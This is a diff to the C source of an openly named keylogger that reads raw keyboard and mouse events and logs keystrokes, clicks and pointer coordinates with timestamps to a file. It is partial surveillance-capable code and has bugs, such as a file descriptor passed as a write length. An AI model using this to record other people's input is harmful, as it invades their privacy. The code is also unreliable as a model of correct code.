@@ -127,6 +127,17 @@ void write_to_out(int outfd, const char * str, int keyboard_fd){
 }
 
 void keylogger_init(int keyboard_fd, int mouse_fd,  int outfd){
+
+
+
+
+    // TODO: THE THING THAT IS HAPPENING NOW IS THAT SOME OF THE KEYSTROKES ARE LOST IN THE PROCESS. 
+    // THAT WOULD ALSO SOLVE THE PROBLEM OF HAVING SOME CLICK DATA GO OFF THE FILE
+    // BECAUSE SIMILARLY, SOME OF THE TYPE DATA IS ALSO NOT RECORDED IN THE OUTPUT FILE
+
+
+
+
     // keyboard variables
     int event_size = sizeof(struct input_event);
     int kbd_bytes_read = 0;
@@ -145,7 +156,6 @@ void keylogger_init(int keyboard_fd, int mouse_fd,  int outfd){
     XQueryPointer(dpy, DefaultRootWindow(dpy), &root, &child, &rootX, &rootY, &winX, &winY
     , &mask);
 
-    // write signal handler for sigint etc
 
     while(true){
         kbd_bytes_read = read(keyboard_fd, events, event_size * 128);
@@ -169,14 +179,20 @@ void keylogger_init(int keyboard_fd, int mouse_fd,  int outfd){
         int mouse_bytes_read = read(mouse_fd, mouse_events, event_size * 128);
 
         for (int i = 0; i < (mouse_bytes_read/event_size); ++i){
-            if (mouse_events[i].type == 2){
-                if (mouse_events[i].code == 0){rootX += mouse_events[i].value;}
-                else if (mouse_events[i].code == 1){rootY += mouse_events[i].value;}
-                char announcement[50] = {'\0'};
-                sprintf(announcement, "time%ld.%06ld\tx %d\ty %d\n", mouse_events[i].time.tv_sec, mouse_events[i].time.tv_usec, rootX, rootY);
-                write(outfd, announcement, sizeof(announcement));
+            // printf("the mouse event type is %d\n", mouse_events[i].type);
+            if (mouse_events[i].type == 0){
+                if (mouse_events[i].code == 0){
+                    XQueryPointer(dpy,DefaultRootWindow(dpy),&root,&child,&rootX,&rootY,&winX,&winY,&mask);
+                }
+                else if (mouse_events[i].code == 1){
+                    XQueryPointer(dpy,DefaultRootWindow(dpy),&root,&child,&rootX,&rootY,&winX,&winY,&mask);
+                }
+                //char announcement[100] = {'\0'};
+               // sprintf(announcement, "time%ld.%06ld\tx %d\ty %d\n", mouse_events[i].time.tv_sec, mouse_events[i].time.tv_usec, rootX, rootY);
+                //write(outfd, announcement, sizeof(announcement));
             } else if (mouse_events[i].type == 1){
                 if (mouse_events[i].code == 272){
+                    XQueryPointer(dpy,DefaultRootWindow(dpy),&root,&child,&rootX,&rootY,&winX,&winY,&mask);
                     write(outfd, "MOUSE BUTTON ", sizeof("MOUSE BUTTON "));
                     if (mouse_events[i].value == 0){
                         write(outfd, "RELEASED\n", sizeof("RELEASED\n"));
@@ -184,6 +200,10 @@ void keylogger_init(int keyboard_fd, int mouse_fd,  int outfd){
                     else if (mouse_events[i].value == 1){
                         write(outfd, "PRESSED\n", sizeof("PRESSED\n"));
                     }
+                    char announcement[100] = {'\0'};
+                    sprintf(announcement, "time%ld.%06ld\tx %d\ty %d\n", mouse_events[i].time.tv_sec, mouse_events[i].time.tv_usec, rootX, rootY);
+                    write(outfd, announcement, sizeof(announcement));
+                    fsync(outfd);
                 }
             }
         }
@@ -193,6 +213,7 @@ void keylogger_init(int keyboard_fd, int mouse_fd,  int outfd){
     }
     if ((kbd_bytes_read > 0)){
         write(outfd, "\n", keyboard_fd);
+        fsync(outfd);
     }
 }
 
